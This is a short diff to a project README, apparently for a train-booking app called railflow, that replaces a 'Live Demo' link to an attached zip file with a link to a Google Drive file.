@@ -252,12 +252,8 @@ Covers registration, login, role authorization, station CRUD, booking, cancellat
 ## License
 
 MIT
-## Live Demo
-    
-
-
-[railflow.zip](https://github.com/user-attachments/files/35134467/railflow.zip)
-
+## Live demo
+https://drive.google.com/file/d/1LVCxqjN6YEtHuN8HZP4FfUL5jabwRnCs/view?usp=drive_link
 
 
 
